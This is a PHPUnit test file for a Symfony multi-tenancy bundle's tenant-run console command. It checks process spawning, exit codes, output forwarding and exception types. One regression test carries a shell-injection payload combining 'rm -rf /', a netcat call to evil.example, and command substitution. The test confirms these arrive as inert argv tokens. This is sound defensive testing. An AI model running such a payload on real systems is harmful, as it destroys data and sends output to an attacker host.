<?php

declare(strict_types=1);

namespace Tenancy\Bundle\Tests\Unit\Command;

use PHPUnit\Framework\MockObject\MockObject;
use PHPUnit\Framework\TestCase;
use Symfony\Component\Console\Tester\CommandTester;
use Symfony\Component\Process\Process;
use Tenancy\Bundle\Command\TenantRunCommand;
use Tenancy\Bundle\Exception\MissingTenantProviderException;
use Tenancy\Bundle\Exception\TenantNotFoundException;
use Tenancy\Bundle\Provider\TenantProviderInterface;
use Tenancy\Bundle\TenantInterface;

final class TenantRunCommandTest extends TestCase
{
    /** @var TenantProviderInterface&MockObject */
    private TenantProviderInterface $tenantProvider;

    protected function setUp(): void
    {
        $this->tenantProvider = $this->createMock(TenantProviderInterface::class);
    }

    public function testValidTenantSpawnsProcess(): void
    {
        $tenant = $this->createMock(TenantInterface::class);
        $this->tenantProvider
            ->expects($this->once())
            ->method('findBySlug')
            ->with('acme')
            ->willReturn($tenant);

        $capturedCommand = null;

        /** @var Process&MockObject $processMock */
        $processMock = $this->createMock(Process::class);
        $processMock->method('run')->willReturn(0);
        $processMock->method('getExitCode')->willReturn(0);

        $processFactory = function (array $command) use ($processMock, &$capturedCommand): Process {
            $capturedCommand = $command;

            return $processMock;
        };

        $command = new TenantRunCommand($this->tenantProvider, '/app', $processFactory);
        $tester = new CommandTester($command);
        $tester->execute(['tenant' => 'acme', 'command_string' => 'app:some-command']);

        $this->assertNotNull($capturedCommand);
        // argv is a literal list — no shell escaping needed
        $this->assertContains('--tenant=acme', $capturedCommand);
        $this->assertContains('app:some-command', $capturedCommand);
        $this->assertContains('/app/bin/console', $capturedCommand);
    }

    public function testChildExitCodePropagated(): void
    {
        $tenant = $this->createMock(TenantInterface::class);
        $this->tenantProvider
            ->method('findBySlug')
            ->willReturn($tenant);

        /** @var Process&MockObject $processMock */
        $processMock = $this->createMock(Process::class);
        $processMock->method('run')->willReturn(42);
        $processMock->method('getExitCode')->willReturn(42);

        $processFactory = fn (array $command): Process => $processMock;

        $command = new TenantRunCommand($this->tenantProvider, '/app', $processFactory);
        $tester = new CommandTester($command);
        $exitCode = $tester->execute(['tenant' => 'acme', 'command_string' => 'app:some-command']);

        $this->assertSame(42, $exitCode);
    }

    public function testOutputForwarded(): void
    {
        $tenant = $this->createMock(TenantInterface::class);
        $this->tenantProvider
            ->method('findBySlug')
            ->willReturn($tenant);

        /** @var Process&MockObject $processMock */
        $processMock = $this->createMock(Process::class);
        $processMock
            ->method('run')
            ->willReturnCallback(function (callable $callback): int {
                $callback(Process::OUT, 'hello world');

                return 0;
            });
        $processMock->method('getExitCode')->willReturn(0);

        $processFactory = fn (array $command): Process => $processMock;

        $command = new TenantRunCommand($this->tenantProvider, '/app', $processFactory);
        $tester = new CommandTester($command);
        $tester->execute(['tenant' => 'acme', 'command_string' => 'app:some-command']);

        $this->assertStringContainsString('hello world', $tester->getDisplay());
    }

    public function testNonexistentTenantThrows(): void
    {
        $this->tenantProvider
            ->method('findBySlug')
            ->willThrowException(new TenantNotFoundException('Tenant "unknown" not found.'));

        $processFactory = fn (array $command): Process => $this->createMock(Process::class);

        $command = new TenantRunCommand($this->tenantProvider, '/app', $processFactory);
        $tester = new CommandTester($command);

        $this->expectException(TenantNotFoundException::class);
        $tester->execute(['tenant' => 'unknown', 'command_string' => 'app:some-command']);
    }

    /**
     * Closes WR-01 (.planning/v0.3-MILESTONE-AUDIT.md).
     *
     * MissingTenantProviderException MUST extend \LogicException (not
     * \RuntimeException) so that when this command is invoked under a
     * Messenger-dispatched context (or any retry-aware runner) the
     * failure is recognized as a permanent operator error — not a
     * transient fault eligible for retry.
     */
    public function testMissingTenantProviderExceptionExtendsLogicException(): void
    {
        // Build the command with a null provider — the zero-config-boot
        // path where `tenancy.provider->nullOnInvalid()` resolved to null
        // because the bundle was never configured.
        $command = new TenantRunCommand(null, '/app', null);
        $tester = new CommandTester($command);

        $caught = null;
        try {
            $tester->execute(['tenant' => 'acme', 'command_string' => 'cache:clear']);
        } catch (\Throwable $e) {
            $caught = $e;
        }

        $this->assertNotNull($caught, 'Expected MissingTenantProviderException was not thrown');
        $this->assertInstanceOf(
            MissingTenantProviderException::class,
            $caught,
            'Null provider in TenantRunCommand::execute() must throw MissingTenantProviderException.',
        );
        $this->assertInstanceOf(
            \LogicException::class,
            $caught,
            'MissingTenantProviderException MUST extend \LogicException so retry-aware runners do NOT retry. See WR-01.',
        );
        // Explicit not-RuntimeException assertion — redundant at the type
        // level (PHPStan can prove it from MissingTenantProviderException's
        // declared ancestry) but kept as runtime documentation: if anyone
        // ever changes the parent class to RuntimeException, this fails.
        // @phpstan-ignore method.alreadyNarrowedType
        $this->assertNotInstanceOf(
            \RuntimeException::class,
            $caught,
            'MissingTenantProviderException MUST NOT extend \RuntimeException — retry-aware runners would treat it as transient. See WR-01.',
        );
        $this->assertStringContainsString('tenancy:run', $caught->getMessage(), 'Exception message must identify the caller context (tenancy:run command).');
        $this->assertStringContainsString('tenancy:install', $caught->getMessage(), 'Exception message must point operators at the install command.');
    }

    /**
     * WR-04 regression — shell metacharacters in the command_string MUST
     * arrive at Process as literal argv tokens, NOT be interpreted by a
     * shell. Previously, $commandString was interpolated into a
     * `Process::fromShellCommandline` line and an attacker controlling
     * command_string could inject arbitrary shell.
     */
    public function testShellMetacharactersAreInertInCommandString(): void
    {
        $tenant = $this->createMock(TenantInterface::class);
        $this->tenantProvider->method('findBySlug')->willReturn($tenant);

        $captured = null;
        /** @var Process&MockObject $processMock */
        $processMock = $this->createMock(Process::class);
        $processMock->method('run')->willReturn(0);
        $processMock->method('getExitCode')->willReturn(0);

        $processFactory = function (array $command) use ($processMock, &$captured): Process {
            $captured = $command;

            return $processMock;
        };

        $cmd = new TenantRunCommand($this->tenantProvider, '/app', $processFactory);
        $tester = new CommandTester($cmd);

        // An attacker-controlled command_string with classic injection payloads.
        // Each shell metacharacter MUST land as part of a literal argv token,
        // never interpreted. The Process array form guarantees this because
        // argv elements pass straight to execve().
        $payload = 'app:harmless; rm -rf / # && whoami | nc evil.example 1337 $(date) `id` > /tmp/pwn';
        $tester->execute(['tenant' => 'acme', 'command_string' => $payload]);

        self::assertIsArray($captured);
        // The whole payload, split only on whitespace, is preserved as tokens
        // with shell metacharacters embedded as plain characters in each token.
        self::assertContains('app:harmless;', $captured);
        self::assertContains('rm', $captured);
        self::assertContains('/', $captured);
        self::assertContains('&&', $captured);
        self::assertContains('|', $captured);
        self::assertContains('$(date)', $captured);
        self::assertContains('`id`', $captured);
        self::assertContains('>', $captured);
        // And the tenant flag still lands correctly, untouched by the payload.
        self::assertContains('--tenant=acme', $captured);
    }
}
